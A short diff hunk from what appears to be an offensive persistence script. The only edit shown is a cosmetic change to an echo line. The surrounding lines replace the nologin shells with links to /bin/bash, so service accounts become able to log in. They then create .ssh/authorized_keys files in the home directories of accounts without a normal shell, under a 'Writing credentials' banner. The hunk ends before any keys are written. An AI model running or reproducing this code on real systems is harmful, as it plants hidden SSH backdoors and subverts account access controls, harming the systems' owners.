@@ -26,7 +26,7 @@ ln -s /bin/bash /usr/sbin/nologin 2> /dev/null
 ln -s /bin/bash /sbin/nologin 2> /dev/null
 
 # Find all nologin user's homedirs
-echo " === Writing credentials ==="
+echo "=== Writing credentials ==="
 for homedir in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f6); do
     mkdir -p $homedir/.ssh 2> /dev/null
     touch $homedir/.ssh/authorized_keys 2> /dev/null
